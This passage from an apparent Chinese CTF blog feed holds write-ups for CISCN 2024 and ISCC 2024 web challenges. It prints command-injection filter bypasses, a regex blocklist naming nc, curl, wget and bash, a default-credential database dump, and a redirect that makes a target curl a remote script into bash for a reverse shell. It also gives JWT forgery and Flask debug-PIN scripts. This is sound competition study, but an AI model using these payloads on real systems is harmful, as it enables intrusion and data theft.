class="hljs-number">42478690444030101869094906005321968598060849172551382502632480617775125215522908666432583017311390935937075283150967678500354031213909256982757457592610576392121713817693171520657833496635639026791597219755461854281419207606460025156812307819350960182028395013278964809309982264879773316952047848608898562420</span><br>e = <span class="hljs-number">65537</span><br><br><span class="hljs-comment"># Compute gcd of n1 and n2 to find shared prime p</span><br>p = GCD(n1, n2)<br><br><span class="hljs-comment"># Compute the other primes q1 and q2</span><br>q1 = n1 // p<br>q2 = n2 // p<br><br><span class="hljs-comment"># Compute phi values</span><br>phi_n1 = (p - <span class="hljs-number">1</span>) * (q1 - <span class="hljs-number">1</span>)<br>phi_n2 = (p - <span class="hljs-number">1</span>) * (q2 - <span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># Compute the private keys d1 and d2</span><br>d1 = inverse(e, phi_n1)<br>d2 = inverse(e, phi_n2)<br><br><span class="hljs-comment"># Decrypt the messages</span><br>m1 = <span class="hljs-built_in">pow</span>(c1, d1, n1)<br>m2 = <span class="hljs-built_in">pow</span>(c2, d2, n2)<br><br><span class="hljs-comment"># Convert the long integers back to bytes</span><br>message1 = long_to_bytes(m1)<br>message2 = long_to_bytes(m2)<br><br><span class="hljs-comment"># Check if the messages are equal</span><br><span class="hljs-keyword">if</span> message1 == message2:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted message:&quot;</span>, message1.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;The decrypted messages are different.&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Message 1:&quot;</span>, message1.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Message 2:&quot;</span>, message2.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ssrf</tag>
      
      <tag>ssti</tag>
      
      <tag>xxe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ciscn2024</title>
    <link href="/2024/05/30/ciscn/2024/ciscn2024/"/>
    <url>/2024/05/30/ciscn/2024/ciscn2024/</url>
    
    <content type="html"><![CDATA[<p>前言：第一次打ciscn，但是web题目是一个不会，借此为数不多的时间想把能照着wp复现的题目写一下。题目目前在ctfshow有复现靶场。</p><h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-string">&#x27;/var/www/html/&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <br>     <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>         <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>&#125;<br>&#125;<br><br><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这是题目的源码，正则限制了很多，可以用在线网站看一下，<a href="https://www.jyshare.com/front-end/7625/#!flags=&re=ls%7Cdir%7Cnl%7Cnc%7Ccat%7Ctail%7Cmore%7Cflag%7Csh%7Ccut%7Cawk%7Cstrings%7Cod%7Ccurl%7Cping%7C%5C*%7Csort%7Cch%7Czip%7Cmod%7Csl%7Cfind%7Csed%7Ccp%7Cmv%7Cty%7Cgrep%7Cfd%7Cdf%7Csudo%7Cmore%7Ccc%7Ctac%7Cless%7Chead%7C%5C.%7C%7B%7C%7D%7Ctar%7Czip%7Cgcc%7Cuniq%7Cvi%7Cvim%7Cfile%7Cxxd%7Cbase64%7Cdate%7Cbash%7Cenv%7C%5C%3F%7Cwget%7C%5C'%7C%5C%22%7Cid%7Cwhoami%2Fi">网站</a>，这里还将到了escapeshellcmd这个函数</p><h3 id="escapeshellcmd函数"><a href="#escapeshellcmd函数" class="headerlink" title="escapeshellcmd函数"></a>escapeshellcmd函数</h3><p>转义和规范化操作有助于确保命令字符串在传递给命令行时能够正确解析，并且不会被误认为是命令或其他恶意代码。</p><p>比如这几种情况</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown">替换命令字符串中的单引号 (&#x27;) 为反斜杠和单引号组合 (\&#x27;)。<br>替换命令字符串中的双引号 (&quot;) 为反斜杠和双引号组合 (\&quot;)。<br>删除命令字符串中的换行符 (\n)。<br>删除命令字符串中的回车符 (\r)。<br></code></pre></td></tr></table></figure><p>比如这种情况</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;127.0.0.1&#x27; -x&quot;</span>;  <span class="hljs-comment">// 这里添加了分号</span><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span> . <span class="hljs-string">&quot;\n&quot;</span>;  <span class="hljs-comment">// 输出 $a，并换行</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span> . <span class="hljs-string">&quot;\n&quot;</span>;  <span class="hljs-comment">// 输出 $b，并换行</span><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>输出为</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">127.0.0.1&#x27; -x<br>127.0.0.1^&#x27; -x<br></code></pre></td></tr></table></figure><p>就是对 ‘进行了转义，再根据题目分析一下好像并没有禁掉\和&#96;尝试可以使用php -r来执行</p><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><p>输入</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">cmd</span>=php -r var_dump(<span class="hljs-string">`l\s`</span>);<br></code></pre></td></tr></table></figure><p><img src="/../../../images/ciscn2024/simple.png" alt="simple"></p><p>进行查看后并没有找到，尝试查看etc&#x2F;passwd的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd=<span class="hljs-built_in">paste</span> /etc/passwd//paste用于合并文件行<br></code></pre></td></tr></table></figure><p><img src="/../../../images/ciscn2024/simple1.png" alt="simple1"></p><p>猜测可能数据藏在mysql数据库中，尝试弹shell，但是在连接之后webshell没有回显这里看到一个方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd=mysqldump -uroot -proot --all-databases<br></code></pre></td></tr></table></figure><p>猜测用户名和密码都是默认的,把数据都dump下来，直接爆库搜就行，用的ctfshow，然后搜一下就行</p><p><img src="/../../../images/ciscn2024/simple2.png" alt="simple2"></p><h3 id="解法2"><a href="#解法2" class="headerlink" title="解法2:"></a>解法2:</h3><p>看了一下内容，由于禁用了很多，可以转hex，然后用php自带的函数，由于不能带引号只能强制截取，直接上payload吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd=php -r <span class="hljs-built_in">eval</span>(hex2bin(substr(_6563686f20606c73202f603b,1)));<br></code></pre></td></tr></table></figure><p><img src="/../../../images/ciscn2024/simple3.png" alt="simple3"></p><p>之后一些列的可以通过先转，逐步爆内容，或者粗暴一点也行。</p><h3 id="解法3"><a href="#解法3" class="headerlink" title="解法3:"></a>解法3:</h3><p>其实连应该是可以连的，但是需要用python监听，我技术太捞了,把这种情况先放在这。网上其他博客或许有。</p><h2 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h2><p>这题知识点我暂时还没有学习，把流程过一下。</p><p>先看一下系统，提示在github上找源码</p><p><img src="/../../../images/ciscn2024/cms1.png" alt="cms1"></p><p>存在ssrf的漏洞下载源码看看</p><p><img src="/../../../images/ciscn2024/cms2.png" alt="cms2"></p><p><img src="/../../../images/ciscn2024/cms3.png" alt="cms3"></p><p>定位了thumb，有curl的，需要传内容，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?s=api&amp;c=api&amp;m=qrcode&amp;text=1&amp;thumb=http://127.0.0.1/flag.php<br></code></pre></td></tr></table></figure><p>随便传点内容，试了不行需要，要用302跳转打内网</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, redirect<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-comment"># 重定向到带有反向shell命令的URL</span><br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;http://127.0.0.1/flag.php?cmd=curl%20http%3A%2F%2F8.130.42.113%3A5566%2Fttt%7Cbash&quot;</span>)<br><span class="hljs-string">&quot;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">if __name__ == &#x27;__main__&#x27;:</span><br><span class="hljs-string">    app.run(host=&#x27;0.0.0.0&#x27;, port=8080)</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>传到linux服务器上面，python3开启httpserver到port上，打开flask服务，然后将thumb改为我们的<a href="http://vps_ip:flask端口上">http://vps_ip:flask端口上</a></p><p>然后nc监听另外一个端口（需要弹shell的</p><p>但是我始终没谈的起来，不明白是不是ctfshow的原因，大概的流程是如此</p><p>用php写也可以。这题只做个记录。</p><p>大概流程就是写个代码开端口a，用php环境开端口b，用hackbar发包改为服务器302重定向路径b,最后开nc监听端口a，在&#x2F;readflag里面有。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ISCC2024回顾</title>
    <link href="/2024/05/26/iscc/iscc2024/"/>
    <url>/2024/05/26/iscc/iscc2024/</url>
    
    <content type="html"><![CDATA[<p>前言:虽然是人脉顿悟赛，归根结底还是要总结一下，因为这个比赛好久没有认真学习了，先把这篇写完吧，只看web部分。</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="还没想好名字的塔防游戏"><a href="#还没想好名字的塔防游戏" class="headerlink" title="还没想好名字的塔防游戏"></a>还没想好名字的塔防游戏</h3><p>这题写的时候其实没有思路的，按照往常的web游戏思路都是改js就行或者玩到底，很多师傅玩的时候还是挺久的。</p><p>先按正常思路看源码搜alert</p><p><img src="/../../images/iscc2024/%E6%B8%B8%E6%88%8F1.png" alt="游戏1"></p><p>看这个以为是什么小说要社工，其实完全想法反了，再上一个图片</p><p><img src="/../../images/iscc2024/%E6%B8%B8%E6%88%8F.png" alt="游戏"></p><p>还有题目的提示  <strong>Flag格式为ISCC{xxx}，其中xxx共有18位，记得数清楚哦！</strong></p><p>仔细研究一下并不是所有的单词首字母都是大写，最后的flag其实就是游戏加提示开头字母大写的拼接起来。应该是ISCC{MDWTSGTMMCCSITTDWS}，也是记上一种新的游戏web了</p><h3 id="Flask中的pin值计算"><a href="#Flask中的pin值计算" class="headerlink" title="Flask中的pin值计算"></a>Flask中的pin值计算</h3><p>这题写的时候后来又刷到pin的时候，小记录了一点，这边也简要写一下吧，后面打算写个pin的总结。</p><p>先上个图片</p><p><img src="/../../images/iscc2024/flaskpin.png" alt="游戏1"></p><p>首先也是看源码吧，没有靶机了，可以看出来是base64，解一下密码是&#x2F;getusername，来到下面的页面，看到海螺其实想到哪个比赛的那个神奇的海螺，考察的知识点是ssit模板注入，看一下这一个页面并不是flask，挨个尝试输入app.py可以得到下面这个图</p><p><img src="/../../images/iscc2024/pin1.png" alt="pin1"></p><p>告诉我username， 输入这个会有回显pincalculate，那就是典型的算pin值的了。</p><p><img src="/../../images/iscc2024/pinu.png" alt="pinu"></p><p>进入crawler这个页面，是一个动态实时的数学计算题目，可以写一个脚本爬一下及时的答题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-comment"># 发送GET请求获取数学表达式</span><br>response = requests.get(<span class="hljs-string">&quot;http://101.200.138.180:10006/get_expression&quot;</span>)<br><span class="hljs-comment"># 如果请求成功</span><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-comment"># 提取数学表达式</span><br>    expression = response.json()[<span class="hljs-string">&#x27;expression&#x27;</span>]<br>    <span class="hljs-comment"># 计算表达式的结果</span><br>    result = <span class="hljs-built_in">eval</span>(expression)<br>    <span class="hljs-comment"># 打印计算结果</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;计算结果:&quot;</span>, result)<br>    <span class="hljs-comment"># 将结果发送到网站</span><br>    response = requests.get(<span class="hljs-string">&quot;http://101.200.138.180:10006/crawler?answer=&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(result))<br>    <span class="hljs-comment"># 打印网站返回的响应内容</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;网站返回的响应:&quot;</span>, response.text)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-comment"># 如果请求失败，打印错误信息</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;获取数学表达式失败，状态码:&quot;</span>, response.status_code)<br><br></code></pre></td></tr></table></figure><p><img src="/../../images/iscc2024/pin2.png" alt="pin2"></p><p>知道了flask使用的版本以及uuidnode位于的地方。</p><p>进到&#x2F;woddenfish的界面，敲了一会我是没敲出个所以然，看看源码给了提示是ISCC_muyu_2024。</p><p><a href="https://jwt.io/#debugger-io">JSON Web Tokens - jwt.io</a>这个网站改改吧，我好像是非预期，莫名其妙的bp点几下就进去了，应该是要根据这个改的进去之后</p><p><img src="/../../images/iscc2024/pin3.png" alt="pin3"></p><p>是这个样子，Unicode解密02:42:ac:18:00:02给了地址，接着去看machine_id</p><p>下面的一个界面我也没截图，大概就是一个俱乐部的界面吧也是需要用脚本跑的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">![pin4](../../images/iscc2024/pin4.png)<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> timedelta<br><span class="hljs-keyword">from</span> json <span class="hljs-keyword">import</span> loads, dumps<br><span class="hljs-keyword">from</span> jwcrypto.common <span class="hljs-keyword">import</span> base64url_decode, base64url_encode<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">topic</span>(<span class="hljs-params">topic</span>):<br>    <span class="hljs-string">&quot;&quot;&quot; Use mix of JSON and compact format to insert forged claims including long expiration &quot;&quot;&quot;</span><br>    [header, payload, signature] = topic.split(<span class="hljs-string">&#x27;.&#x27;</span>)<br>    parsed_payload = loads(base64url_decode(payload))<br>    parsed_payload[<span class="hljs-string">&#x27;role&#x27;</span>] = <span class="hljs-string">&quot;vip&quot;</span><br>    fake_payload = base64url_encode(<br>        (dumps(parsed_payload, separators=(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>))))<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#123;&quot;  &#x27;</span> + header + <span class="hljs-string">&#x27;.&#x27;</span> + fake_payload + <span class="hljs-string">&#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27;</span> + header + <span class="hljs-string">&#x27;&quot;, &quot;payload&quot;:&quot;&#x27;</span> + payload + <span class="hljs-string">&#x27;&quot;,&quot;signature&quot;:&quot;&#x27;</span> + signature + <span class="hljs-string">&#x27;&quot;&#125;&#x27;</span><br>originaltoken = <span class="hljs-string">&#x27;&#x27;&#x27;这里面是页面的&#x27;&#x27;&#x27;</span><br>topic = topic(originaltoken)<br><span class="hljs-built_in">print</span>(topic)<br><br></code></pre></td></tr></table></figure><p>要给jwt一个验证带入跑一下就行。</p><p><img src="/../../images/iscc2024/pin4.png" alt="pin4"></p><p>得到supervip的key用GitHub脚本可以直接出，自己clone就行</p><p><img src="/../../images/iscc2024/pin5.png" alt="pin5"></p><p>之后伪造一下就行了</p><p><img src="/../../images/iscc2024/pin6.png" alt="pin6"></p><p>这样所有的数据就得到了，这里注意版本啊，劳累我交wp还把版本的交错了高版本sha1，低版本md5</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br><br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-comment">#/etc/passwd</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,<span class="hljs-comment">#默认值</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,<span class="hljs-comment">#默认值</span><br>    <span class="hljs-string">&#x27;/usr/local/lib/python3.11/site-packages/flask/app.py&#x27;</span><span class="hljs-comment">#moddir，报错得到</span><br>]<br><br>private_bits = [<br>    <span class="hljs-string">&#x27;&#x27;</span>,/sys/<span class="hljs-keyword">class</span>/net/eth0/address 十进制<br>    <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-comment">#看上面machine-id部分</span><br>]<br><br><span class="hljs-comment"># 下面为源码里面抄的，不需要修改</span><br>h = hashlib.sha1()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br><br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br><br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br><br>rv = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br><br><span class="hljs-built_in">print</span>(rv)<br></code></pre></td></tr></table></figure><p>最后再console里面交一下pin码就出答案了。</p><h3 id="与时俱进"><a href="#与时俱进" class="headerlink" title="与时俱进"></a>与时俱进</h3><p>这题没写，最后的顿悟的太厉害了，我估摸着我跟着顿悟wp说不定还没交上，看起来也挺难的，如有有空再说吧，</p><h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>这题是原题啊[<a href="https://blog.csdn.net/qq_45837896/article/details/126026576#De1CTF_2019SSRF_Me_2">De1CTF 2019]SSRF Me</a>，跟着走一遍吧。下面是源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#! /usr/bin/env python</span><br><span class="hljs-comment"># #encoding=utf-8</span><br>from flask import Flask<br>from flask import request<br>import socket<br>import hashlib<br>import urllib<br>import sys<br>import os<br>import json<br>reload(sys)<br>sys.setdefaultencoding(<span class="hljs-string">&#x27;latin1&#x27;</span>)<br> <br>app = Flask(__name__)<br> <br>secert_key = os.urandom(16)<br> <br>class Task:<br>    def __init__(self, action, param, sign, ip):<br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        self.sandbox = md5(ip)<br>        <span class="hljs-keyword">if</span>(not os.path.exists(self.sandbox)):<br>            os.mkdir(self.sandbox)<br> <br>    def Exec(self):<br>        result = &#123;&#125;<br>        result[<span class="hljs-string">&#x27;code&#x27;</span>] = 500<br>        <span class="hljs-keyword">if</span> (self.checkSign()):<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                tmpfile = open(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)<br>                resp = scan(self.param)<br>                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span> resp<br>                    tmpfile.write(resp)<br>                    tmpfile.close()<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = 200<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                f = open(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = 200<br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br>            <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == 500:<br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            result[<span class="hljs-string">&#x27;code&#x27;</span>] = 500<br>            result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>        <span class="hljs-built_in">return</span> result<br> <br>    def checkSign(self):<br>        <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):<br>            <span class="hljs-built_in">return</span> True<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">return</span> False<br> <br>@app.route(<span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<br>def geneSign():<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-built_in">return</span> getSign(action, param)<br> <br>@app.route(<span class="hljs-string">&#x27;/De1ta&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>])<br>def challenge():<br>    action = 